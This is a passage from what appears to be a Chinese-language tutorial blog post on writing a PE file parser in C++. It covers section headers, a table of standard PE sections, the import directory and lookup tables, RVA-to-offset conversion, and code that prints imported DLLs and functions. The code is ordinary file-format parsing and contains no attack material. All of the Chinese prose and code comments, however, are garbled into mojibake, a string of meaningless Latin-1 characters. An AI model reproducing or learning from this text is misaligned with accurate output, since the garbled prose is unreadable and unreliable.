section_headersä¸ºæŒ‡é’ˆå˜é‡ï¼Œéœ€è¦åŠ¨æ€åˆ†é…ç©ºé—´</span><br>section_headers = (___PIMAGE_SECTION_HEADER)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER) * nt_sections_cnt);<br><span class="hljs-keyword">if</span> (!section_headers) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Section_headers malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos, SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(section_headers, <span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER), nt_sections_cnt, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != nt_sections_cnt) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_section_headers_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br><span class="hljs-type">int</span> i;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"====Section Headers===\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"Number of Sections: %d\n\n"</span>, nt_sections_cnt);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nt_sections_cnt; i++) {<br><br>BYTE* section_name = (BYTE*)<span class="hljs-built_in">malloc</span>(___IMAGE_SIZEOF_SHORT_NAME + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!section_name) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Section_name malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>section_name[___IMAGE_SIZEOF_SHORT_NAME] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memcpy</span>(section_name, section_headers[i].Name, ___IMAGE_SIZEOF_SHORT_NAME);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * %s:\n"</span>, section_name);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Virtual Address: 0x%X\n"</span>, section_headers[i].VirtualAddress);<br><span class="hljs-comment">// virtual size æ˜¯è¯¥èŠ‚åŒºè£…åœ¨åˆ°å†…å­˜çš„æ€»å¤§å°ï¼Œå¦‚æœå€¼å¤§äºSizeOfRawDataåˆ™å¤šå‡ºçš„éƒ¨åˆ†ç”¨0x00å¡«å……</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Virtual Size: 0x%X\n"</span>, section_headers[i].Misc.VirtualSize);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Pointer to Raw Data: 0x%X\n"</span>, section_headers[i].PointerToRawData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Raw Data's Size: 0x%X\n"</span>, section_headers[i].SizeOfRawData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Characteristics: 0x%X\n\n"</span>, section_headers[i].Characteristics);<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/9.png"></p><hr><h3 id="æœ¬èŠ‚å°ç»“"><a href="#æœ¬èŠ‚å°ç»“" class="headerlink" title="æœ¬èŠ‚å°ç»“"></a>æœ¬èŠ‚å°ç»“</h3><ul><li>æœ¬èŠ‚ä¸»è¦è§£æäº†PE32æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬<code>DOS Header</code>ã€<code>Rish Headers</code>ã€<code>NT Headers</code>å’Œ<code>Section Headers</code>ï¼Œå¹¶é€šè¿‡è¿™ç§è§£æçš„è¿‡ç¨‹äº†è§£äº†PEæ–‡ä»¶çš„ç»“æ„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/10.png"></p><ul><li>æ­¤å¤–è¿˜å‰©ä¸‹éœ€è¦å…·ä½“åˆ†æçš„æ˜¯Sectionä¿¡æ¯ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­è¯¦ç»†ä»‹ç»</li></ul><h2 id="Step-3-è§£æSections"><a href="#Step-3-è§£æSections" class="headerlink" title="Step 3: è§£æSections"></a>Step 3: è§£æSections</h2><ul><li>PEæ–‡ä»¶çš„SectionsåŒ…æ‹¬[12]ï¼š</li></ul><table><thead><tr><th align="left">Section Name</th><th align="left">Content</th><th align="left">Characteristics</th></tr></thead><tbody><tr><td align="left">.bss</td><td align="left">æœªåˆå§‹åŒ–æ•°æ®(free format)</td><td align="left">IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.cormeta</td><td align="left">CLR metadata that indicates that the object file contains managed code</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.data</td><td align="left">å·²åˆå§‹åŒ–æ•°æ®(free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.debug$F</td><td align="left">Generated FPO debug information (object only, x86 architecture only, and now obsolete)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$P</td><td align="left">Precompiled debug types (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$S</td><td align="left">Debug symbols (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$T</td><td align="left">Debug types (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.drective</td><td align="left">Linker options</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.edata</td><td align="left">å¯¼å‡ºè¡¨</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.idata</td><td align="left">å¯¼å…¥è¡¨</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.idlsym</td><td align="left">Includes registered SEH (image only) to support IDL attributes. For information, see â€œIDL Attributesâ€ in <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#references">References</a> at the end of this topic.</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.pdata</td><td align="left">å¼‚å¸¸ä¿¡æ¯</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.rdata</td><td align="left">åªè¯»çš„å·²åˆå§‹åŒ–æ•°æ®</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.reloc</td><td align="left">é•œåƒé‡å®šå‘</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.rsrc</td><td align="left">èµ„æºç›®å½•</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.sbss</td><td align="left">GP-relative uninitialized data (free format)</td><td align="left">IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.sdata</td><td align="left">GP-relative initialized data (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.srdata</td><td align="left">GP-relative read-only data (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.sxdata</td><td align="left">Registered exception handler data (free format and x86/object only)</td><td align="left">IMAGE_SCN_LNK_INFO Contains the symbol index of each of the exception handlers being referred to by the code in that object file. The symbol can be for an UNDEF symbol or one that is defined in that module.</td></tr><tr><td align="left">.text</td><td align="left">å¯æ‰§è¡Œæ±‡ç¼–ç  (free format)</td><td align="left">IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IIMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.tls</td><td align="left">çº¿ç¨‹å±€éƒ¨å­˜å‚¨(object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.tls$</td><td align="left">Thread-local storage (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.vsdata</td><td align="left">GP-relative initialized data (free format and for ARM, SH4, and Thumb architectures only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.xdata</td><td align="left">Exception information (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr></tbody></table><ul><li>æ¥ä¸‹æ¥æˆ‘ä»¬å°†è§£æSectionsä¸­æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªSectionçš„æ•°æ®</li></ul><h3 id="Step-3-1-è§£æPEå¯¼å…¥è¡¨ï¼ˆ-idataï¼‰"><a href="#Step-3-1-è§£æPEå¯¼å…¥è¡¨ï¼ˆ-idataï¼‰" class="headerlink" title="Step 3.1: è§£æPEå¯¼å…¥è¡¨ï¼ˆ.idataï¼‰"></a>Step 3.1: è§£æPEå¯¼å…¥è¡¨ï¼ˆ.idataï¼‰</h3><ul><li><p><code>.idata</code>èŠ‚å­˜å‚¨ç€æ‰€æœ‰çš„å¯¼å…¥ç¬¦å·ï¼Œå…¶åŒ…å«ä¸‹é¢å‡ ä¸ªå†…å®¹[13]ï¼š</p><ul><li><p><strong>å¯¼å…¥ç›®å½•è¡¨</strong></p><p>Null ç›®å½•æ¡ç›®</p></li><li><p>DLL1 å¯¼å…¥æŸ¥æ‰¾è¡¨</p><p>Null</p></li><li><p>DLL2 å¯¼å…¥æŸ¥æ‰¾è¡¨</p><p>Null</p></li><li><p>DLL3 å¯¼å…¥æŸ¥æ‰¾è¡¨</p><p>Null</p></li><li><p>æç¤º/åç§°è¡¨</p></li></ul></li></ul><hr><p><strong>1. å¯¼å…¥ç›®å½•è¡¨</strong></p><ul><li>å¯¼å…¥ç›®å½•è¡¨çš„æ¯ä¸€ä¸ªå­—æ®µçš„å«ä¹‰ï¼š</li></ul><table><thead><tr><th>åç§»</th><th>å¤§å°</th><th>å­—æ®µå</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>å¯¼å…¥æŸ¥æ‰¾è¡¨çš„RVA<br><strong>Import Lookup Table RVA<br>ï¼ˆCharacteristicsï¼‰</strong></td><td>å¯¼å…¥æŸ¥æ‰¾è¡¨ILTçš„RVAï¼Œè¯¥è¡¨åŒ…å«æ¯ä¸€ä¸ªå¯¼å…¥çš„åå­—æˆ–åºå·</td></tr><tr><td>4</td><td>4</td><td>æ—¶é—´/æ—¥æœŸæˆ³<br><strong>Time/Date Stamp</strong></td><td>åœ¨é•œåƒè¢«ç»‘å®šå‰è¯¥å­—æ®µè®¾ç½®ä¸º0ï¼Œåœ¨ç»‘å®šä¹‹åè¯¥å­—æ®µè®¾ç½®ä¸ºDLLçš„æ—¶é—´/æ—¥æœŸæˆ³</td></tr><tr><td>8</td><td>4</td><td>è½¬å‘é“¾<br><strong>Forwarder Chain</strong></td><td>ç¬¬ä¸€ä¸ªè½¬å‘å™¨å¼•ç”¨çš„ç´¢å¼•</td></tr><tr><td>12</td><td>4</td><td>åå­—çš„RVA<br><strong>Name RVA</strong></td><td>åŒ…å«è¯¥DLLåå­—çš„ASCIIå­—ç¬¦ä¸²åœ°å€ï¼Œè¯¥åœ°å€ç›¸å¯¹äºé•œåƒåŸºå€</td></tr><tr><td>16</td><td>4</td><td>å¯¼å…¥åœ°å€è¡¨RVA<br><strong>Import Address Table RVA (Thunk Table)</strong></td><td>å¯¼å…¥åœ°å€è¡¨IATçš„RVAï¼Œåœ¨é•œåƒè¢«ç»‘å®šä¹‹å‰ï¼Œè¯¥è¡¨çš„å†…å®¹ä¸å¯¼å…¥æŸ¥æ‰¾è¡¨ILTå†…å®¹ç›¸åŒ</td></tr></tbody></table><p><strong>2. å¯¼å…¥æŸ¥æ‰¾è¡¨ILT</strong></p><ul><li>å¯¹äºPE32æ¥è¯´ï¼Œè¯¥è¡¨æ˜¯ä¸€ä¸ª32ä½æ•°å­—çš„æ•°ç»„ï¼›å¯¹äºPE32+æ¥è¯´ï¼Œè¯¥è¡¨æ˜¯64ä½æ•°å­—çš„æ•°ç»„</li><li>å¸ƒå±€[13]ï¼š</li></ul><table><thead><tr><th align="left">Bit(s)</th><th align="left">Size</th><th align="left">Bit field</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">31/63</td><td align="left">1</td><td align="left">Ordinal/Name Flag</td><td align="left">If this bit is set, import by ordinal. Otherwise, import by name. Bit is masked as 0x80000000 for PE32, 0x8000000000000000 for PE32+.</td></tr><tr><td align="left">15-0</td><td align="left">16</td><td align="left">Ordinal Number</td><td align="left">A 16-bit ordinal number. This field is used only if the Ordinal/Name Flag bit field is 1 (import by ordinal). Bits 30-15 or 62-15 must be 0.</td></tr><tr><td align="left">30-0</td><td align="left">31</td><td align="left">Hint/Name Table RVA</td><td align="left">A 31-bit RVA of a hint/name table entry. This field is used only if the Ordinal/Name Flag bit field is 0 (import by name). For PE32+ bits 62-31 must be zero.</td></tr></tbody></table><p><strong>3. æç¤º/åç§°è¡¨ï¼šHint/Name Table</strong></p><ul><li>å¸ƒå±€[13]ï¼š</li></ul><table><thead><tr><th>åç§»</th><th>å¤§å°</th><th>å­—æ®µå</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>2</td><td>æç¤º</td><td>å¯¼å‡ºåç§°æŒ‡é’ˆè¡¨çš„ç´¢å¼•</td></tr><tr><td>2</td><td>-</td><td>åç§°</td><td>å¯¼å…¥åç§°ASCIIå­—ç¬¦ä¸²</td></tr><tr><td>*</td><td>0 or 1</td><td>å¡«å……</td><td></td></tr></tbody></table><p><strong>4. å¯¼å…¥åœ°å€è¡¨IAT</strong></p><ul><li>åœ¨é•œåƒè¢«ç»‘å®šä¹‹å‰ï¼ŒIATä¸­çš„ç»“æ„å’Œå†…å®¹ä¸ILTç›¸åŒ</li><li>åœ¨é•œåƒè¢«ç»‘å®šä¹‹åï¼ŒIATä¸­çš„å®ä½“è¢«é‡å†™ä¸ºéœ€è¦å¯¼å…¥çš„32ä½/64ä½çš„ç¬¦å·åœ°å€ï¼Œi.e. <strong>è¯¥è¡¨åœ¨è¿è¡Œæ—¶ä¼šè¢«PEåŠ è½½å™¨é‡å†™</strong></li></ul><hr><ul><li><p>è§£ææµç¨‹ï¼š</p><ul><li>åœ¨Step 2.3èŠ‚ä¸­ï¼Œæˆ‘ä»¬è§£æäº†<code>NT Headers</code>ä¸­çš„<code>Data Directory</code>å­—æ®µï¼Œè€Œè¯¥å­—æ®µä¸­å°±å­˜å‚¨äº†<code>Import Directory</code>çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€RVAï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è½¬æ¢ä¸ºæ–‡ä»¶ä¸­çš„åç§»åœ°å€</li><li>RVA â€“&gt; RAWï¼š<ol><li>é¦–å…ˆåº”è¯¥éå†æ‰€æœ‰èŠ‚åŒºï¼Œæ‰¾åˆ°è¯¥RVAå±äºå“ªä¸€ä¸ªèŠ‚åŒº</li><li><code>Section Headers</code>è®°å½•äº†å„ä¸ªSectionçš„<code>Virtual Address</code>å’Œ<code>Pointer to Raw Data</code>ï¼Œè¯¥åœ°å€<strong>åœ¨æ–‡ä»¶ä¸­çš„åç§»RAW = RVA - Sectionâ€™s Virtual Address + Pointer to Raw Data</strong>ï¼ˆæˆ‘ä»¬å°†è¯¥åŠŸèƒ½å°è£…åˆ°ä¸€ä¸ªå‡½æ•°ä¸­ï¼‰</li><li>è¯»å–å¹¶è§£æRAWä¸­çš„æ•°æ®</li></ol></li><li>ä¸¾ä¾‹ï¼šæˆ‘ä»¬å‡è®¾å¯¼å…¥ç›®å½•è¡¨çš„RVAä¸º0x1D1F4ï¼Œ<code>.idata</code>çš„<code>Virtual Address</code>ä¸º 0x1D000ä¸”å¤§å°ä¸º0xBE7ï¼Œå› æ­¤è¯¥RVAåœ¨<code>.idata</code>æ®µå†…ï¼›ç„¶åï¼Œæˆ‘ä»¬æ ¹æ®<code>.idata</code>çš„<code>Pointer to Raw Data</code>å€¼0xA800ï¼Œæ‰¾åˆ°è¯¥å¯¼å…¥ç›®å½•è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»å€¼ä¸º0xA800+ï¼ˆ0x1D1F4-0x1D000ï¼‰= <strong>0xA9F4</strong></li><li>å¯¼å…¥ç›®å½•è¡¨å®ä½“æ•°å¯ä»¥ç”±<code>Import Directory</code>çš„å¤§å°é™¤ä»¥20å­—èŠ‚å¾—åˆ°ï¼Œè¯·æ³¨æ„æœ€åä¸€ä¸ªå®ä½“ä¸ºå…¨0å¡«å……</li></ul></li><li><p>å¤„ç†ä»£ç ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_import_directory</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br>DWORD raw_offset, entry_num, read_size;<br><br><span class="hljs-comment">// å…ˆæ£€æŸ¥import_dir_table_sizeçš„åˆæ³•æ€§ï¼Œæ‹’ç»éæ³•PEæ–‡ä»¶</span><br><span class="hljs-keyword">if</span> (import_dir_table_size % <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR) != <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Wrong Import Directory size. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>entry_num = import_dir_table_size / <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR);<br><span class="hljs-comment">// è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå¯¼å…¥ç›®å½•è¡¨æœ€åä¸€ä¸ªå®ä½“ä¸ºå…¨0å¡«å……</span><br><span class="hljs-comment">// è¿™é‡Œå…¶å®æ²¡å¿…è¦è¯»å–æœ€åä¸€ä¸ªå®ä½“çš„å†…å®¹</span><br>entry_num = entry_num - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> (entry_num &gt; <span class="hljs-number">0xffff</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many import entries!"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>raw_offset = <span class="hljs-built_in">va_to_raw</span>(import_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, raw_offset, SEEK_SET);<br><br>import_dir_table_entries = (___PIMAGE_IMPORT_DESCRIPTOR)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR) * entry_num);<br><span class="hljs-keyword">if</span> (!import_dir_table_entries) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Import_dir_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>read_size = <span class="hljs-built_in">fread</span>(import_dir_table_entries, <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR), entry_num, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != entry_num) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>import_dir_table_entries_num = entry_num;<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_import_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br>DWORD i, j, name_size, name_rva;<br><span class="hljs-type">char</span>* name_tmp, ch = <span class="hljs-number">1</span>;<br>___IMAGE_IMPORT_BY_NAME hint;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======Import table====\n\n"</span>);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; import_dir_table_entries_num; i++) {<br><br>name_rva = import_dir_table_entries[i].Name;<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><br><span class="hljs-comment">// ç¡®å®šåå­—çš„é•¿åº¦</span><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">256</span>) { <br><span class="hljs-comment">// æ‹’ç»åç§°å¤§äº256çš„DLLåå­—ï¼ˆå¯¹éæ³•PEçš„æ£€æŸ¥ï¼‰</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: DLL's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * %s:\n\n"</span>, name_tmp);<br><span class="hljs-built_in">free</span>(name_tmp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Import Lookup Table (ILT): 0x%X (RVA), 0x%X (RAW)\n"</span>,<br>import_dir_table_entries[i].DUMMYUNIONNAME.OriginalFirstThunk,<br><span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].DUMMYUNIONNAME.OriginalFirstThunk));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Import Address Table (IAT): 0x%X (RVA), 0x%X (RAW)\n"</span>,<br>import_dir_table_entries[i].FirstThunk,<br><span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].FirstThunk));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Bound?: %s\n"</span>, import_dir_table_entries[i].TimeDateStamp ? <span class="hljs-string">"TRUE"</span> : <span class="hljs-string">"FALSE"</span>);<br><br><br><span class="hljs-comment">// ILTå’ŒIATå€¼åœ¨PEåŠ è½½å‰æ˜¯ä¸€æ ·çš„ï¼Œéšä¾¿è¯»å–å“ªä¸€ä¸ªéƒ½è¡Œ</span><br><span class="hljs-comment">// è§£æå…·ä½“å‡½æ•°å</span><br>    <span class="hljs-comment">// https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-idata-section</span><br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries: \n\n"</span>);<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; ; j++) {<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].FirstThunk + j * <span class="hljs-built_in">sizeof</span>(DWORD)), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;name_rva, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (name_rva == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (!(name_rva &amp; <span class="hljs-number">0x80000000</span>)) {<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;hint, <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_BY_NAME), <span class="hljs-number">1</span>, pe_fp);<br>hint.Name[<span class="hljs-number">99</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 